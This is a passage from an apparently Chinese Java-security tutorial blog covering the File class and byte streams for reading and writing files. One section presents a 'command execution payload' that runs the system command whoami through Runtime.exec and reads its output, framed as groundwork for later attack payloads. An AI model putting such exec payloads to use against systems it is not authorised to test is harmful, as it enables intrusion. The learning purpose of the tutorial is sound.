<span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        createFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">parentFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile&quot;</span>);  <br> <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(parentFile, <span class="hljs-string">&quot;new2.txt&quot;</span>);  <br> <span class="hljs-keyword">try</span>&#123;  <br>            file.createNewFile();  <br> System.out.println(<span class="hljs-string">&quot;Create Successfully&quot;</span>);  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h4 id="方式三：根据父目录路径，在子路径下生成文件"><a href="#方式三：根据父目录路径，在子路径下生成文件" class="headerlink" title="方式三：根据父目录路径，在子路径下生成文件"></a>方式三：根据父目录路径，在子路径下生成文件</h4><ul><li>方法 <code>new File(String parent, String child)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.File;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// 根据父目录路径，在子路径下生成文件  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">newFile03</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        createFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">parentPath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile&quot;</span>;  <br> <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;new3.txt&quot;</span>;  <br> <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(parentPath, fileName);  <br> <span class="hljs-keyword">try</span>&#123;  <br>            file.createNewFile();  <br> System.out.println(<span class="hljs-string">&quot;Create Successfully&quot;</span>);  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="获取文件信息"><a href="#获取文件信息" class="headerlink" title="获取文件信息"></a>获取文件信息</h3><p>通过 <code>file</code> 类的方法名进行一些基本信息的获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.File;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GetFileInfo</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        getFileContents();  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">getFileContents</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;Serialable/src/IOStream/CreateForFile/new1.txt&quot;</span>);  <br> System.out.println(<span class="hljs-string">&quot;文件名称为：&quot;</span> + file.getName());  <br> System.out.println(<span class="hljs-string">&quot;文件的绝对路径为：&quot;</span> + file.getAbsolutePath());  <br> System.out.println(<span class="hljs-string">&quot;文件的父级目录为：&quot;</span> + file.getParent());  <br> System.out.println(<span class="hljs-string">&quot;文件的大小(字节)为：&quot;</span> + file.length());  <br> System.out.println(<span class="hljs-string">&quot;这是不是一个文件：&quot;</span> + file.isFile());  <br> System.out.println(<span class="hljs-string">&quot;这是不是一个目录：&quot;</span> + file.isDirectory());  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a22.png"></p><p>成功获取</p><h3 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h3><ul><li>使用 <code>file.delete(文件)</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-comment">// 文件删除</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileDelete</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        deleteFile();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteFile</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>);<br>        System.out.println(file.delete() ? <span class="hljs-string">&quot;Delete Successfully&quot;</span>:<span class="hljs-string">&quot;Delete failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>顺利删除</p><h3 id="目录删除"><a href="#目录删除" class="headerlink" title="目录删除"></a>目录删除</h3><ul><li>方法 <code>file.delete(目录)</code>，这里有个小坑，只有空的目录才可以删除，不然会显示删除失败。</li><li>我在 <code>CreateForFile</code> 同级目录下新建了一个文件夹 <code>CreateForDelete</code> 用以测试。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;<br><br><span class="hljs-keyword">import</span> java.io.File;<br><br><span class="hljs-comment">//删除目录</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectoryDelete</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        deleteDirectory();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deleteDirectory</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/CreateForDelete&quot;</span>);<br>        System.out.println(file.delete()? <span class="hljs-string">&quot;Delete Successfully&quot;</span>:<span class="hljs-string">&quot;Delete failed&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>成功删除</p><h3 id="创建单级目录"><a href="#创建单级目录" class="headerlink" title="创建单级目录"></a>创建单级目录</h3><ul><li>方法 <code>file.mkdir()</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br><br><span class="hljs-keyword">import</span> java.io.File;  <br><br><span class="hljs-comment">// 创建单级目录  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateSingleDirectory</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        createSingleDir();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createSingleDir</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/CreateForDirectory&quot;</span>);  <br> System.out.println(file.mkdir() ? <span class="hljs-string">&quot;Create Successfully&quot;</span>:<span class="hljs-string">&quot;Create failed&quot;</span>);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>成功创建</p><h3 id="创建多级目录"><a href="#创建多级目录" class="headerlink" title="创建多级目录"></a>创建多级目录</h3><ul><li>方法 <code>file.mkdirs()</code>，注意多了个 <strong>s</strong> 别搞错了。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.File;  <br>  <br><span class="hljs-comment">// 创建多级目录  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CreateMultiDirectory</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        createMultiDir();  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createMultiDir</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;src/main/java/src/IOStream/CreateMultiDirectory/test&quot;</span>);  <br> System.out.println(file.mkdirs() ? <span class="hljs-string">&quot;Create Successfully&quot;</span>:<span class="hljs-string">&quot;Create failed&quot;</span>);  <br>  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><h2 id="IO流分类"><a href="#IO流分类" class="headerlink" title="IO流分类"></a>IO流分类</h2><p>按照操作数据单位不同分为：<strong>字节流</strong>和<strong>字符流</strong></p><ul><li>字节流（8bit，适用于二进制文件）</li><li>字符流（按字符，因编码不同而异，适用于文本文件）</li></ul><p>按照数据流流向不同分为：<strong>输入流</strong>和<strong>输出流</strong></p><p>按照流的角色不同分为：<strong>节点流</strong>，<strong>处理流&#x2F;包装流</strong></p><table><thead><tr><th>抽象基类</th><th>字节流</th><th>字符流</th></tr></thead><tbody><tr><td>输入流</td><td>InputStream</td><td>Reader</td></tr><tr><td>输出流</td><td>OutputStream</td><td>Writer</td></tr></tbody></table><p>在 <strong>Java I&#x2F;O</strong> 体系里，输入（Input）和输出（Output) 是 <strong>以程序自身为参照物</strong> 来定义的：</p><ul><li><p>Input（输入流）   是数据 <strong>从外部（文件、网络、键盘等）流入到程序</strong></p></li><li><p>Output（输出流）是数据 <strong>从程序流出到外部（文件、网络、显示器等）</strong></p></li><li><p>到这里就非常重要了，因为它与我们后续的命令执行直接相关。这些 IO 流在我们命令执行的 Payload 当中充当着缓冲的作用。</p></li></ul><h2 id="关于文件流的一些操作"><a href="#关于文件流的一些操作" class="headerlink" title="关于文件流的一些操作"></a>关于文件流的一些操作</h2><h3 id="Runtime-命令执行操作的-Payload"><a href="#Runtime-命令执行操作的-Payload" class="headerlink" title="Runtime 命令执行操作的 Payload"></a>Runtime 命令执行操作的 Payload</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.CommandExec;  <br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;  <br><span class="hljs-keyword">import</span> java.io.InputStream;  <br><br><span class="hljs-comment">// 使用 Runtime 类进行命令执行  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RuntimeExec</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        <span class="hljs-comment">// 通过 Runtime.getRuntime().exec(&quot;whoami&quot;) 执行系统命令 &quot;whoami&quot;</span><br>        <span class="hljs-comment">// 并获取该进程的标准输出流（InputStream）</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>).getInputStream();  <br><br>        <span class="hljs-comment">// 定义一个缓存区，用于存放每次从输入流中读取的数据</span><br>        <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];  <br><br>        <span class="hljs-comment">// 用 ByteArrayOutputStream 来存储完整的输出内容（因为输出可能分多次读完）</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();  <br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br>        <span class="hljs-comment">// 循环读取命令执行的结果，直到读到 -1（表示流结束）</span><br>        <span class="hljs-keyword">while</span> ((readLen = inputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>            <span class="hljs-comment">// 把本次读取的内容写入 byteArrayOutputStream 中</span><br>            byteArrayOutputStream.write(cache, <span class="hljs-number">0</span>, readLen);  <br>        &#125;  <br><br>        <span class="hljs-comment">// 打印命令执行的结果</span><br>        System.out.println(byteArrayOutputStream);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>在看到这里时心里有一个问题：<strong>InputStream 是输入流，为什么这里拿来读取命令输出？</strong></p><p>关键在于 <strong>“输入&#x2F;输出” 是相对谁而言的</strong>。</p><ol><li><p>InputStream 的名字来源</p><p>在 <strong>Java 程序的角度</strong>：</p><p><code>InputStream</code> &#x3D; “从外部读入到 Java 程序里的流”</p><p><code>OutputStream</code> &#x3D; “从 Java 程序写出到外部的流”</p><p>所以 <code>InputStream</code> 的 <strong>输入</strong>，是“输入到 Java 程序”的意思。</p></li><li><p>在这个例子里</p><p>你调用了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>);<br><span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br></code></pre></td></tr></table></figure></li></ol><ul><li>这个 <code>process</code> 是一个外部子进程（系统命令 <code>whoami</code>）。</li><li><strong>对这个子进程来说</strong>，它调用 <code>System.out.println(...)</code> 输出结果。</li><li><strong>对你的 Java 程序来说</strong>，你要去读取它的输出 → 这个输出就成了你程序的 <strong>输入流</strong>。</li></ul><p>​      所以这里叫 <code>getInputStream()</code>，是 <strong>获取子进程的标准输出，作为本进程的输入流</strong>。</p><ol start="3"><li><p>举个生活类比</p><p>想象你去快餐店点餐：</p><ul><li>厨房（子进程）把做好的餐点“输出”给你。</li><li>你（Java 程序）把餐点“拿来吃”，这对你来说就是“输入”。</li></ul><p>所以 <strong>同一份数据，既是厨房的输出，也是你的输入</strong>。</p></li></ol><h3 id="FileInputStream"><a href="#FileInputStream" class="headerlink" title="FileInputStream"></a>FileInputStream</h3><h4 id="read-方法"><a href="#read-方法" class="headerlink" title="read() 方法"></a>read() 方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java">read() <br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">read</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException <br>从此输入流中读取一个数据字节。<br><br>如果没有输入可用，则此方法将阻塞。 <br><br>指定者： 类 InputStream 中的 read <br><br>返回： 下一个数据字节；如果已到达文件末尾，则返回 -<span class="hljs-number">1</span>。 <br><br>抛出： IOException - 如果发生 I/O 错误。<br></code></pre></td></tr></table></figure><p>之前我们用 <code>file</code> 的一系列操作读取过文件的信息，现在我们用 <code>FileInputStream.read()</code> 来读取文件内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// 使用 FileInputStream.read 读取文件  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInputRead</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        readFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;  <br> <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> <span class="hljs-type">int</span> <span class="hljs-variable">readData</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-keyword">try</span>&#123;  <br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath);  <br> <span class="hljs-keyword">while</span>((readData = fileInputStream.read())!=-<span class="hljs-number">1</span>)&#123;  <br>                System.out.print((<span class="hljs-type">char</span>)readData);  <br> &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>            e.printStackTrace();  <br> &#125; <span class="hljs-keyword">finally</span> &#123;  <br>            <span class="hljs-keyword">try</span>&#123;  <br>                fileInputStream.close();  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>                e.printStackTrace();  <br> &#125;  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/java%E5%AE%89%E5%85%A8/a23.png"></p><p>成功读取到文件内容，这里有个小坑</p><ul><li>使用print((char)readData)，字符能够连贯输出</li><li>使用println((char)readData)换行，每输出一个字符就会换行</li></ul><h4 id="read-byte-d-方法"><a href="#read-byte-d-方法" class="headerlink" title="read(byte[] d) 方法"></a>read(byte[] d) 方法</h4><p>允许在方法中添加一个字节数组。<br>这种方式很有意思，当我们设置缓冲区的值为 8 时，若文件中的字符长度超过了 8，则会换行输出。这和上面的换行实际上是异曲同工。</p><p>再回到之前我们讲的 <code>Runtime</code> 类进行命令执行的 Payload，在那里，我们设置的 Cache 缓冲区的值为 1024.</p><p><strong>read(byte[] d) 方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;  <br>  <br><span class="hljs-keyword">import</span> java.io.FileInputStream;  <br><span class="hljs-keyword">import</span> java.io.IOException;  <br>  <br><span class="hljs-comment">// read(byte[] d) 方法，允许在方法中添加一个字节数组  </span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileInputRead02</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        readFile();  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readFile</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-type">String</span> <span class="hljs-variable">filePath</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;src/main/java/src/IOStream/CreateForFile/new1.txt&quot;</span>;  <br> <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;  <br> <span class="hljs-type">byte</span>[] cache = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">8</span>]; <span class="hljs-comment">// 设置缓冲区，缓冲区大小为 8 字节  </span><br> <span class="hljs-type">int</span> <span class="hljs-variable">readLen</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;  <br> <span class="hljs-keyword">try</span> &#123;  <br>            fileInputStream = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(filePath);  <br> <span class="hljs-keyword">while</span>((readLen = fileInputStream.read(cache)) != -<span class="hljs-number">1</span>)&#123;  <br>                System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(cache, <span class="hljs-number">0</span>, readLen));  <br> &#125;  <br>        &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>                e.printStackTrace();  <br> &#125; <span class="hljs-keyword">finally</span> &#123;  <br>            <span class="hljs-keyword">try</span> &#123;  <br>                fileInputStream.close();  <br> &#125; <span class="hljs-keyword">catch</span> (IOException e)&#123;  <br>                e.printStackTrace();  <br> &#125;  <br>        &#125;  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>这里while函数会运行两次，读取文件中所有字符</p><p><img src="/img/java%E5%AE%89%E5%85%A8/a24.png"></p><h3 id="FileOutputStream"><a href="#FileOutputStream" class="headerlink" title="FileOutputStream"></a>FileOutputStream</h3><p>往文件里面写数据</p><h4 id="write-byte-b-方法"><a href="#write-byte-b-方法" class="headerlink" title="write(byte[] b) 方法"></a>write(byte[] b) 方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">write(<span class="hljs-type">byte</span>[] b)<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">write</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] b)</span><br>           <span class="hljs-keyword">throws</span> IOException<br>将 b.length 个字节从指定 <span class="hljs-type">byte</span> 数组写入此文件输出流中。<br>覆盖：<br>类 OutputStream 中的 write<br>参数：<br>b - 数据。<br>抛出：<br>IOException - 如果发生 I/O 错误。<br></code></pre></td></tr></table></figure><p>实现代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> src.IOStream;<br><br><span class="hljs-keyword">import</span> java.io.FileNotFoundException;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-comment">// write(byte[] b) 方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FileOutputWrite01</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        writeFile();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> 